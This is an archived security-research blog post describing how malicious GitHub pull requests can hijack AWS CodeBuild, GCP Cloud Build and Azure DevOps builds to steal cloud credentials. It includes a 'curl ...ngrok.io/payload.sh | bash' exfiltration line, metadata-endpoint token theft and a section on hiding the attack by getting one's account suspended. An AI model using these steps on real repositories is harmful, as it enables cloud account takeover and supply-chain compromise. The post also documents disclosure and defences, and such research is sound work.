---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2023-07-22_hijacking-cloud-cicd-systems-for-fun-and-profit.md
original_filename: 2023-07-22_hijacking-cloud-cicd-systems-for-fun-and-profit.md
title: Hijacking Cloud CI/CD Systems for Fun and Profit
category: documents
detected_topics:
- cloud-security
- supply-chain
- ssrf
- command-injection
- otp
- api-security
tags:
- imported
- documents
- cloud-security
- supply-chain
- ssrf
- command-injection
- otp
- api-security
language: en
raw_sha256: 503538872af119d86d0656b3bb39609e67d891814dd682b625107e785d01da45
text_sha256: 5c4cc39509eb533cc04595ab608c0aa0b3aa6f01e90bb4e8f5e376316785eeee
ingested_at: '2026-06-28T07:32:24Z'
sensitivity: unknown
redactions_applied: false
---

# Hijacking Cloud CI/CD Systems for Fun and Profit

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2023-07-22_hijacking-cloud-cicd-systems-for-fun-and-profit.md
- Source Type: markdown
- Detected Topics: cloud-security, supply-chain, ssrf, command-injection, otp, api-security
- Ingested At: 2026-06-28T07:32:24Z
- Redactions Applied: False
- Raw SHA256: `503538872af119d86d0656b3bb39609e67d891814dd682b625107e785d01da45`
- Text SHA256: `5c4cc39509eb533cc04595ab608c0aa0b3aa6f01e90bb4e8f5e376316785eeee`


## Content

---
title: "Hijacking Cloud CI/CD Systems for Fun and Profit"
page_title: "Hijacking Cloud CI/CD Systems for Fun and Profit | Researchs"
url: "https://divyanshu-mehta.gitbook.io/researchs/hijacking-cloud-ci-cd-systems-for-fun-and-profit#azure"
final_url: "https://seg-fault.gitbook.io/researchs/hijacking-cloud-ci-cd-systems-for-fun-and-profit#azure"
authors: ["Divyanshu (@gh0st_r1d3r_0x9)"]
programs: ["Google (GCP)", "AWS", "Microsoft (Azure)"]
bugs: ["Cloud", "CI/CD", "Repojacking"]
bounty: "50,000"
publication_date: "2023-07-22"
added_date: "2023-07-24"
source: "pentester.land/writeups.json"
original_index: 906
---

For the complete documentation index, see [llms.txt](https://seg-fault.gitbook.io/researchs/llms.txt). This page is also available as [Markdown](https://seg-fault.gitbook.io/researchs/hijacking-cloud-ci-cd-systems-for-fun-and-profit.md).

Copy

On this page

# Hijacking Cloud CI/CD Systems for Fun and Profit

This research details a new technique that can be used by threat actors for supply chain attacks on open-source repositories using GCP, Azure and AWS.

## 

Abstract

This research focuses on very less talked CI/CD systems on GitHub. Many organisations are using the cloud to build PRs on Github which sometimes includes passing unsafe external PR code directly into their build systems. There has been very little research on this area since the majority were focused on leaking either secrets or executing commands in build pipelines. We will be releasing a new technique where we will talk about how we hacked into Cloud Build systems to access underlying cloud accounts of various companies via a single malicious external PR on Github for profit. We will be talking majorly about AWS, GCP, and Azure along with how you can cover your tracks and stay low on radar. In the end, we will talk about how organizations can detect this and prevent this (not possible in a few cloud providers :p).

Mentions: Special thanks to [Harsh](https://twitter.com/HarshVaragiya) for helping out with Azure for this research.

## 

Introduction

This research talks about how the authors were able to hijack multiple Fortune 500 companies due to the way cloud-based CI/CD is configured and how a potential full-blown repository takeover is just a PR away.

This research will present novel ways for hijacking build systems in the top 3 cloud providers i.e. AWS, GCP, and Azure. Going forward, each case study will explain how to perform this attack in their respective cloud counterpart. Although we will talk about these 3 cloud providers, you can extend this research to other cloud providers like IBM Cloud, Alibaba Cloud, etc.

The impact of this attack can vary from possible supply chain attacks to cloud account compromise in specific scenarios. 

Before diving right into attack, let's see what the modern CI/CD system looks like.

### 

What do modern CI/CD systems look like?

Modern CI/CD systems are generally either completely on the cloud or coupled with the cloud.

![](https://seg-fault.gitbook.io/researchs/~gitbook/image?url=https%3A%2F%2Flh3.googleusercontent.com%2F1Wy4rBaldUdfsyEahTrC-_TTbpEc9Zt2ZT_u4qmpvP2nUSdoM4okgym7UkBsIRQlychIAqKJiuyqQBdSJIQda1PZ5gsa6pO3BG6fd9ptzxx9U8453atlw6lm4_0qvRrdQ56Cga0Skvf4ik2kpXP_iA&width=768&dpr=3&quality=100&sign=3f7911a7&sv=2)

Modern CI CD Systems

Modern CI systems generally use intermediate build steps which are later then coupled with other cloud-based equivalent services. These intermediate systems can vary from either Gtihub actions, Gitlab actions, or any intermediate build provider like Jenkins. The Build systems on the other hand can be various cloud services like AWS’s CodeBuild and Codepipeline, GCP’s CloudBuild, and Azure’s DevOps.

In cases where intermediate build providers are GitHub actions, there is a protection against first-time-based contributors where workflow needs to be approved via the collaborator/owner of the target repository and post that the workflow is executed. Moreover, for cases where a trigger-based approach is used, secrets and other sensitive information are not shared with the PR and hence the attack generally stops since there needs to be some past legit PR which would help circumvent GitHub actions protections.

In cases where you are lucky enough to get organizations using direct cloud-based build systems, it has interesting implications. Anyone on the internet can simply go ahead and browse the repository in order to search for buildspec.yml (for AWS), cloudbuild..yml (for GCP), azure-pipelines.yml (for Azure DevOps), or any other config file of CI providers that allows you to run builds on the cloud. This along with old PRs on GitHub can help confirm if there are any build checks being performed on first-time contributors which can aid attackers in identifying such targetable repositories. Once identified, such cases would allow any fork-based PR to trigger the build systems which makes the attack overall easy.

## 

Meat of Attack

Let’s start with AWS first.

## 

AWS

AWS is the world’s largest cloud provider with a majority share in the cloud business. Before we dive deep into the attack, let's understand the build systems in AWS. 

In AWS CI/CD systems generally consist of CodePipeline and CodeBuild. CodePipeline acts as a single unit consisting of various stages which are called build stages. A build stage comprises a unique CodeBuild project which implies that running a stage indirectly resolves to running a codebuild project.

Hence, it's correct to conclude that a Codepipeline system can contain multiple stages which further implies that multiple codebuild projects can be directly linked with a single trigger of codepipeline. 

Now that we are familiar with the codepipeline let's talk about codebuild. CodeBuild, according to AWS, is a “managed integration service that runs tests, builds scripts, etc. on AWS”. The point here to note is that Codebuild unlike any other service supports integration of various other AWS services. This implies that a single codebuild project might be using for instance S3 for artifact storage, SecretsManager for secrets, and ECS for deployment. This single codebuild project might be broken down into multiple codebuild projects as a best practice but the overall gist remains the same We can directly invoke other AWS services from a Codebuild project. 

Now how can we invoke other services from codebuild? This happens due to the CodeBuild IAM role. You can attach an IAM role to codebuild projects and allow permissions to other AWS services as needed which indirectly allows codebuild to access these services.

Having discussed the background of the build systems on AWS, let's talk about how the whole bits and pieces link together to form the hijacking attack chain.

#### 

Technical Analysis of CodeBuild 

All fingers point to a single culprit, codebuild. The way codebuild works is inherently dangerous if untrusted code is passed into its build project. As mentioned before, a codebuild project contains an IAM role which usually has permissions to perform defined actions with other AWS services. As for any IAM role, we can obtain STS credentials for this role from an internal metadata endpoint located at 169.254.170.2 (this is mentioned in AWS Docs hidden a bit deep). The trick here lies in that this metadata endpoint is exposed to code running inside the codebuild project. This has a high risk if untrusted code running in the codebuild system queries 169.254.170.2 and obtains these STS tokens which later can be exfiltrated out from the build container.

From the attacker's perspective, all he/she has to do is somehow trigger the run of a codebuild project query the metadata endpoint and in subsequent stages, simply exfiltrate the STS credentials as part of the building code.

#### 

Demo

We will be now looking at how to perform this attack. For this demo, I have connected my personal repository to build any PR using CodeBuild on AWS. This demo application has a test case located in the test folder called “test-application.py” along with the main application code located in the “application.py” file in the root directory. Now this repository uses CodeBuild for validating PR against the repository. We will now consider 2 cases, cases where we know the content of buildspec.yml and cases where we are not aware of buildspec.yml.

Case I: Buildspec.yml known

The buildspec.yml for this demo is shown below. There is a pre_build step and build step which are basically executing a bunch of Python files. In this case, we will directly interact with buildspec.yml

We basically fork this project and create a commit where we add `curl https://xxxxxxxxxxxxxxxxx.ngrok.io/payload.sh | bash` to the buildspec.yml and create a PR to the master repository. Once PR is raised codebuild is triggered and the new modified buildspec.yml with our payload is executed

![](https://seg-fault.gitbook.io/researchs/~gitbook/image?url=https%3A%2F%2F1804885456-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FIo3S6x9y21ea77Yw303B%252Fuploads%252FPhW0NP8Vwg2gbA2EAU4n%252Ftest3.png%3Falt%3Dmedia%26token%3D5875afb1-f3e1-42e1-b073-cfc3977ff227&width=768&dpr=3&quality=100&sign=e62f4778&sv=2)

Codebuild check running on Github

Now, let's discuss the core of the exploit and the content of the payload.sh file.

This file basically queries instance metadata and exfiltrates back to our server.

![](https://seg-fault.gitbook.io/researchs/~gitbook/image?url=https%3A%2F%2F1804885456-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FIo3S6x9y21ea77Yw303B%252Fuploads%252FhPDKWdiStq5DOlJOEvY0%252Ftest.png%3Falt%3Dmedia%26token%3D6221596f-a247-47e6-b1f1-51563999d5fc&width=768&dpr=3&quality=100&sign=7c9e5d64&sv=2)

STS Tokens exfilterated

This base64 encoded value when decoded back is basically STS tokens valid for 1 hour 

![](https://seg-fault.gitbook.io/researchs/~gitbook/image?url=https%3A%2F%2F1804885456-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FIo3S6x9y21ea77Yw303B%252Fuploads%252Fg46n7UlwDgcEN2h2Ux9z%252Ftest2.png%3Falt%3Dmedia%26token%3Da03a9a1c-90ef-43f7-9fb8-a345d9e398a1&width=768&dpr=3&quality=100&sign=7166de10&sv=2)

codebuild demo role

This can be now used to enumerate the AWS account where codebuild is running. The majority of the time big projects will use an S3 bucket to upload artifacts, a secrets manager to fetch secrets during build, etc. which can be enumerated, and sensitive information can be obtained. Overly permissive codebuild roles are just the cherry on the top. 

Case II: Buildspec.yml is not exposed in the source code

For cases where buildspec.yml is not exposed to the public, we mainly focus on test cases. As for any open source application, external PR is generally validated by running a set of unit test cases which can act as an entry point for our attack. So you can add a commit in the corresponding language where `curl https://xxxx-zzz-xxx-zzz-xxx.in.ngrok.io/payload.sh | bash` is executed or if you are determined enough, just add the above line in all files xD.

For this case, we will add the below lines in “test_application.py” 

The rest of the steps remain the same where we go ahead and create PR and get those STS tokens to start enumerating the underlying codebuild AWS account.

#### 

How to Detect & Prevent this?

The way going forward for detection and prevention is to ingest GitHub logs for each PR. Unfortunately, by default, Codebuild doesn’t have any protections against this and this is how codebuild literally is supposed to work. The recommended method is to couple codebuild with GitHub actions so that any external PR from a first-time contributor gets dealt with GitHub actions which would effectively act as a first layer of defense against this attack.

Also having an extremely tight scope on the build IAM role would ensure that even if the credentials for the role were to get leaked, an external attacker could not do much harm. 

## 

GCP

GCP is the third largest cloud provider with a smaller yet significant market share. Similar to AWS, it also has its own, better-mature build systems. Let's talk about those before talking about the attack.

The GCP CI/CD system generally consists of CloudBuild which is way more mature in terms of security than AWS. According to GCP, it is “​​A fully managed continuous integration, delivery & deployment platform that lets you run fast, consistent, reliable automated builds”. So if a project wants to build and deploy code, all it has to do is configure its GitHub repository to use Cloudbuild and the building and deployment would be taken care of.

Similar to how AWS uses the IAM role to allow CodeBuild to connect with other AWS services, GCP uses the Service role with CloudBuild to connect to other GCP services. So obtaining metadata credentials for the service role in Cloudbuild would allow anyone to access other GCP services.

Unlike AWS, GCP is more mature in terms of the security of build systems. GCP has the option to allow administrators to control the execution of build systems from external PRs via “Comment Control”. Comment Control is a feature where collaborators/project owners need to comment “/gcbrun” to trigger the build against the PR and using this feature inherently prevents anyone on the internet from triggering your build systems.

#### 

Technical Analysis of CloudBuild

Like AWS, CloudBuild uses Service Role for authentication with GCP and allows Cloudbuild to connect with other GCP Services. The instance metadata is present at 169.254.169.254 at computeMetadata/v1/instance/service-accounts/default/token endpoint which gives out short-lived (~1hr) access tokens. The trick here is that this instance metadata endpoint is also exposed to the code running inside the cloudbuild making the exploit very easy.

All the attacker has to do now is create a PR containing code that queries the metadata endpoint and later exfiltrate the access tokens. Once access tokens are obtained, we can use them directly with `gcloud` to view all projects that are linked with those access tokens.

Now, in order to exploit this, an attacker can create PR and modify any file that will be executed by Cloudbuild and make sure the payload gets executed. For instance, in some cases, it would be beneficial to edit “cloudbuild.yml” and add the below stage:-

The above stage will simply curl a file from our server and execute it in the pipeline. Below are the contents of `file.sh`

`File.sh` queries instance metadata and sends the access token back to our server.

Now this is not only limited to adding a stage in cloudbuild.yml since in some cases, it might not work out. In such situations, it's always better to go and modify any file that is being referenced by cloudbuild.yml and make sure the content of the `file.sh` is getting executed.

#### 

How to Detect & Prevent this?

The easy way to prevent this is to use Comment Control which was built to prevent PR from executing cloudbuild projects. This will prevent this exploit from running against your organization. GCP has a way to use “/gcbrun” where any collaborator or owner of the repository can comment “/gcbrun” to trigger the build process. This works as an effective first layer of defense against the attack.

## 

Azure

Microsoft has its own offering for an equivalent cloud build system called Azure DevOps. Azure DevOps is an integral part of building systems for the majority of Windows-based applications.

Like GCP and AWS, Azure uses Service Identities to manage permissions a build pipeline has. In Azure, you can create a service connection using Managed Identity and pass that connection name to Azure pipelines to use your Azure service connection and run Azure commands to interact with other Azure services.

Our research on Azure has faced some challenges as we were not able to reliably exfil the SYSTEM_ACCESSTOKEN from the Azure build environment. We also noticed that under certain conditions, the CI part for Azure DevOps happens on a container inside a VM in more restrictive environments, in those instances we found that we could easily circumvent this by just removing the azure-pipelines configuration that specifies the container image effectively allowing us to execute a payload on the VM as the source of truth for the pipeline configuration is taken as the one in the PR. We were still able to exfiltrate the SYSTEM_ACCESSTOKEN for ~50% of the time from Linux and Windows Build environments. 

Also, unlike AWS and GCP, access to IMDS service for Azure is restricted by an Azure agent running on the build VM. What this means is that we can’t simply go ahead and query any metadata endpoint from code building in those VMs. This majorly stops these issues but at the same time we also noticed that in some instances, the agent cached temporary access tokens under the work/_temp directory while building artifacts. So it might be possible to get SYSTEM_ACCESSTOKEN and Personal Access Tokens from the _temp directory in cases where it’s not exposed.

On the other hand, a definitive way to hijack Azure build is to look for repositories using “AzureCli@2” as part of build steps in pipelines. This way we can inject other az commands like “az account get-access-token” to receive access tokens of the subscription in question and exfiltrate that.

Once we have the access token, we can impersonate the credentials of the target Azure subscription and move laterally into Azure. The above attack is theoretically possible but at the same time, it is scarce in real life.

We have covered almost all major cloud providers but let’s not forget about Jenkins. Like any other build system, Jenkins also suffers from the same type of attack. DevOps engineers are using Jenkins in integration with other cloud providers like AWS, and GCP which introduces the same range of attacks in Jenkins. All the attacker now has to do is create PR which dumps all environment variables along with querying meta-data endpoints (169.254.169.254 in AWS) to retrieve the STS tokens which can now be used to move laterally into AWS.

#### 

Potential Impact

This technique allows external attackers access to the underlying Cloud Service accounts. The majority of CI/CD pipelines are configured to have direct access to their container registry to upload images as part of their production release coupled with other cloud services that aid in release like storage, and secrets manager. Once the underlying role is compromised, this would allow the attacker to have direct push access to the container registry which could pave the way for supply chain attacks directly affecting all customers.

#### 

Covering your Tracks

First of all, any PR raised is clearly visible to the public in Github and to the target GitHub account. In GitHub by default, we can’t delete a PR of the internet, but there is a twist. For Github accounts that are suspended by Github, all of their PRs are automatically deleted and removed from the internet. So in order to hide your activity you need to either get your GitHub account suspended or get your account flagged. This would hide all your activities on GitHub from the internet (basically remove all your exploit PR)

Pro Tip: An organization in GitHub is very proactive in reporting accounts to GitHub. All you need to do is share “some stuff” in Issue and they will make sure your account is suspended in 12 hours :p and there you have, made your exploit invisible on github. 

The only way for an organization to figure out they have been targeted is to check GitHub logs from SIEM since from GitHub UI the PR would be removed.

## 

Impact

This research would have enabled me to push malicious code into various GitHub projects with 1k starts+ and had a huge blast radius on all major cloud providers. This research won me the highest bounty from Google in their flagship supply chain category and also won me an invitation to Google bugSWAT & Escal 2023 happening in Tokyo this year, so if you are in Tokyo during October, would be happy to meet.

The codebuild method was reported to the open-source project FoundationDB managed via Apple.

Companies reported to so far: Google, Apple, etc. For Google around 6-7 of their open source repositories were found to be using the vulnerable setup of Cloudbuild and it was swiftly fixed. 

PS : If you are hiring for security research, would be happy to connect. 

[PreviousBypassing DEP - Increasing the Gap](/researchs/bypassing-dep-increasing-the-gap)[NextFound some Access Keys?](/researchs/found-some-access-keys)

Last updated 2 years ago
